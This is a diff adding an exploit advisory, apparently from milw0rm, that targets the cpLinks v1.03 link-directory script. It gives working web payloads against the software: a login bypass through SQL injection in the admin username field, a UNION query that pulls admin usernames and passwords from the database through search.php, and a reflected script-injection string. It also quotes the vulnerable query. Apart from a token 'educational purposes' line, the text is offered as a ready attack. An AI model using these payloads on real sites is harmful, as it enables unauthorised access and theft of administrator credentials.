@@ -1,0 +1,106 @@
+|-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
+|     _                   __           __       __          ______     |
+|   /' \            __  /'__`\        /\ \__  /'__`\       /\  ___\    |
+|  /\_, \    ___   /\_\/\_\L\ \    ___\ \ ,_\/\ \/\ \  _ __\ \ \__/    |
+|  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\ \___``\  |
+|     \ \ \/\ \/\ \ \ \ \/\ \L\ \/\ \__/\ \ \_\ \ \_\ \ \ \/ \/\ \L\ \ |
+|      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\  \ \____/ |
+|       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/   \/___/  |
+|                  \ \____/ >> Kings of injection                      |
+|                   \/___/                                             |
+|                                                                      |
+|-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
+
+Title :: cpLinks v1.03 Multiple Vulnerabilities (bypass/SQL/XXS)
+
+
+Author :: InjEctOr [s0f (at) w (dot) cn]
+
+&& FishEr762  [SQ7 (at) w (dot) cn ]
+
+
+Script Site :: http://www.cplinks.com/
+
+Dork  :: ThinkinG 
+
+Greets :: Allah ,TryaG TeaM & Muslims Hackers
+
+Terms of use :: This exploit is just for educational purposes, DO NOT use it for illegal acts.
+
+
+
+--------------------------------------------[C o n t e x t]-----------------------------------------
+
+
+
+
+##########################
+##Expl0!T1 bypass login ##
+##########################
+
+
+http://[site]/[script]/admin/
+
+
+in username filed insert:
+
+' or 1=1 /*    
+
+addition, some time must type any thing in password field
+
+
+
+#####################################
+## Explo!T 2  Reomte SQL Injection ##
+#####################################
+
+file/
+search.php
+
+
+@ line 57 ::
+
+
+$query = "SELECT
+			category,
+			sub_category,
+			title,
+			url,
+			description,
+			status
+			FROM mnl_links
+			WHERE category='$search_category'
+			AND description LIKE '%$search_text%'
+			AND approved='yes'
+			ORDER BY status, rec_timestamp";
+
+
+search url: http://localhost/[script's_bad_day]/search.php
+
+so just insert in search filed this query :)
+
+' union select admin_username,admin_password,3,4,5,6 from mnl_admin/*
+
+
+##################
+## EXpl!T3 Xss  ##
+##################
+
+
+Vulnerability found in script search.php .. also !
+
+
+in search field insert  >"> and then  xss c0de ::
+
+
+
+example: >"><script>alert("!! InjEctOr TeaM Became Here !!")</script>>
+
+
+
+############### T|-|4t'5 4ll ############### 
+
+
+-------------------------------------------[End of  context]----------------------------------------
+
+# milw0rm.com [2008-05-04]
